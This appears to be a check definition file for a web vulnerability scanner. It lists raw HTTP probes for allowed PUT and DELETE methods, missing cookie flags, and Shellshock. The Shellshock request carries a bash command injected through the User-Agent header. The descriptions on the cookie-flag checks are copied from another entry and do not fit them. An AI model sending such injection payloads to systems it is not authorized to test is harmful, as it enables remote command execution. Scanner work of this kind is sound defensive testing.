IS OPEN.description: Using HTTP instead of HTTPS can be dangerous when exchanging sensitive data

PUT METHOD ALLOWED.send:
PUT / HTTP/1.1
Host: host:port
Connection: close

DELETE METHOD ALLOWED.send:
DELETE / HTTP/1.1
Host: host:port
Connection: close

SHELLSHOCK.description: We can use arbitrary headers to access the website
SHELLSHOCK.send:
GET / HTTP/1.1
Host: host:port
User-Agent: () { :;}; /bin/bash -c 'echo SHELLSHOCK!!'

NO SECURE FLAG IN COOKIE.description: We can use arbitrary headers to access the website
NO SECURE FLAG IN COOKIE.send:
GET / HTTP/1.1
Host: host:port
Connection: close

NO HTTPONLY FLAG IN COOKIE.description: We can use arbitrary headers to access the website
NO HTTPONLY FLAG IN COOKIE.send:
GET / HTTP/1.1
Host: host:port
Connection: close
